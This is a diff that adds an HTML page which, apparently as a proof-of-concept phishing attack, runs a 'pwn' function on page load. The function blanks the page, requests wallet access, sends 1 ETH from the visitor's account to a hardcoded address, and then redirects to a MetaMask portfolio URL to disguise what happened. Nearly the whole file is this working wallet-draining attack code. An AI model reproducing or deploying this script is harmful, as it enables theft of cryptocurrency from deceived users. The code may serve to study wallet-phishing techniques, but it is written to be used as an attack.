@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+
+    <h2 id="status">Hi</h2>
+
+    <script>
+
+async function sendEthereum() {
+    try {
+        // Request account access
+        await ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Get the user's account
+        const accounts = await ethereum.request({ method: 'eth_accounts' });
+        const senderAddress = accounts[0];
+
+        // Specify the recipient address and the amount to send
+        const recipientAddress = '0xd8da6bf26964af9d7eed9e03e53415d37aa96045'; // Replace with the recipient's address
+        const amountInEther = '1.0'; // 1 Ethereum
+
+        // Convert the amount to Wei (smallest unit of Ether)
+        const amountInWei = Web3.utils.toWei(amountInEther, 'ether');
+
+        // Create the transaction object
+        const transactionParameters = {
+            to: recipientAddress,
+            from: senderAddress,
+            value: Web3.utils.toHex(amountInWei), // Convert to hexadecimal
+            gas: '21000' // Set the gas limit, adjust if necessary
+        };
+
+        // Send the transaction
+        const txHash = await ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [transactionParameters],
+        });
+
+        console.log('Transaction sent:', txHash);
+        alert(`Transaction successful! Hash: ${txHash}`);
+    } catch (error) {
+        console.error('Error sending Ethereum:', error);
+        alert(`Error: ${error.message}`);
+    }
+}
+
+
+function pwn(){
+            // Clear contents
+            document.body.innerText='spoof';
+            // Change location to spoof
+           sendEthereum();
+            // Add a little delay before displaying the connection 
+            setTimeout(()=>{ location = 'https://portfolio.metamask.io/';}, 500);
+}
+
+        // Check if already connected on page load
+        window.addEventListener('load', pwn);
+    </script>
+</body>
+</html>
